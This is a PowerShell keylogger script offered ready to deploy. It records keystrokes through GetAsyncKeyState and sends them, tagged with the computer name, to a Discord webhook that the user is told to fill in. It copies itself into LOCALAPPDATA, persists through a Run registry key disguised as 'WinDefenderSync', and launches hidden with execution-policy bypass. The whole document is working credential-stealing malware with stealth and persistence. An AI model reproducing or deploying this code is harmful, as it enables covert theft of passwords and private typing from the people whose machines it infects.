# Configuration - YOU MUST REPLACE THIS WITH YOUR NEW URL
$W = "YOUR_NEW_DISCORD_WEBHOOK_URL_HERE"
$P = "WinDefenderSync"
$F = "$env:LOCALAPPDATA\win_sync.ps1"

# 1. The Core Logic (Updated for resilience and character escaping)
$C = @"
`$W = '$W'; `$N = `$env:COMPUTERNAME; `$L = ''
Add-Type -Type 'using System;using System.Runtime.InteropServices;public class K{[DllImport("user32.dll")]public static extern short GetAsyncKeyState(int v);]}'
while(`$true){
    Start-Sleep -m 40
    for(`$i=8;`$i -le 190;`$i++){
        if([K]::GetAsyncKeyState(`$i) -eq -32767){
            `$k = [char]`$i
            # Basic sanitization for JSON safety
            if (`$k -eq '"') { `$k = "'" }
            if (`$k -eq '\') { `$k = "/" }
            `$L += `$k
            
            if (`$L.Length -ge 25) {
                `$Payload = @{
                    username = "GHOST_`$N"
                    content  = "[$N]: `$L"
                } | ConvertTo-Json
                
                try {
                    Invoke-RestMethod -Uri `$W -Method Post -Body `$Payload -ContentType "application/json"
                    `$L = ''
                } catch {
                    # If webhook is 404/Unknown, don't crash, just wait
                    Start-Sleep -s 10
                }
            }
        }
    }
}
"@

# 2. Drop and Persist
if (-not (Test-Path $F)) {
    $C | Out-File -FilePath $F -Encoding ascii -Force
    $RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
    New-ItemProperty -Path $RegPath -Name $P -Value "powershell.exe -W H -Exec Bypass -File `"$F`"" -PropertyType String -Force
}

# 3. Execution
Start-Process powershell.exe -ArgumentList "-W H -NoP -Exec Bypass -File `"$F`"" -WindowStyle Hidden
